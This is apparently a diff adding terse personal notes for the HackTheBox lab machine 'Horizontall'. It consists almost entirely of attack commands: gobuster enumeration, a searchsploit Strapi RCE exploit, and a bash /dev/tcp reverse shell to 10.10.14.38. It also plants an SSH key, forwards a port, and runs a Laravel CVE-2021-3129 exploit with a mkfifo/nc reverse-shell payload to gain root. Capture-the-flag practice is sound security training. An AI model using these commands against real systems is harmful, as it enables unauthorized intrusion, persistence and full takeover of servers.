@@ -1,0 +1,29 @@
+//Based on Burak Ozlu
+gobuster vhost -u http://horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_subdomains.txt
+api-prod.horizontall.htb
+gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb -o gobuster_api.txt
+view-source:http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js
+strapi: 3.0.0-beta.17.4
+searchsploit strapi
+searchsploit -m multiple/webapps/50239.py
+python3 50239.py http://api-prod.horizontall.htb
+
+rlwrap nc -lvnp 9001
+bash -c 'bash -i >& /dev/tcp/10.10.14.38/9001 0>&1'	//got user
+
+//LinEnum
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1889/node /usr/bin/
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -  
+
+curl http://127.0.0.1:8000	//Laravel v8
+https://github.com/nth347/CVE-2021-3129_exploit		//doesn't run on box(tries to access git), need to do it on attackers machine
+//port forward, first need to create keys and ssh
+mkdir /opt/strapi/.ssh
+echo "<key>" > authorized_keys
+ssh -i id_rsa 10.10.11.105
+~C
+-L8000:127.0.0.1:8000		//no can access port with localhost:8000
+
+nc -lvnp 9005
+./exploit.py http://localhost:8000 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 9005 >/tmp/f"
+	//got root
